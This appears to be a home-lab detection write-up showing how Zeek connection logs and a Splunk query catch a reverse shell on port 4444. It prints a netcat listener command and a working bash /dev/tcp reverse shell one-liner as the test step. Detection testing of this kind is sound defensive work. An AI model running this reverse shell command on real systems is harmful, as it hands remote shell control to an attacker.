# Reverse Shell Detection
Detects a network connection where a compromised system initiates a connection back to an attacker-controlled machine and provides a command shell.

Test performed: Kali opened a listener on TCP port 4444, and Ubuntu initiated a reverse shell connection back to Kali. Zeek conn.log captured the connection and the event was detected in Splunk.

## Kali listener: 
```bash

nc -lvnp 4444
```
## Ubuntu test:
```bash
bash -i >& /dev/tcp/192.168.20.11/4444 0>&1
```
Zeek connection telemetry was forwarded to Splunk.

## Detection:
```bash

index=zeek sourcetype=zeek:conn
"192.168.20.12" "192.168.20.11" "4444"
```

This detects the network connection associated with the reverse shell test.
